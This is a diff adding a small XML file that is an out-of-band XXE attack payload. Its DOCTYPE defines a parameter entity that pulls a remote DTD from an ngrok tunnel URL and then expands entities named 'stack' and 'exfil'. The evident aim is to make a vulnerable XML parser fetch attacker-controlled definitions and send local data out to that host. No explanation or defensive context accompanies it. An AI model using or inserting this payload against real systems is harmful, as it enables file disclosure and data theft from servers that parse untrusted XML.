@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "https://f11b-187-110-209-74.ngrok-free.app/oob_xxe.dtb">
+    %xxe;
+    %stack;
+    %exfil;
+]>
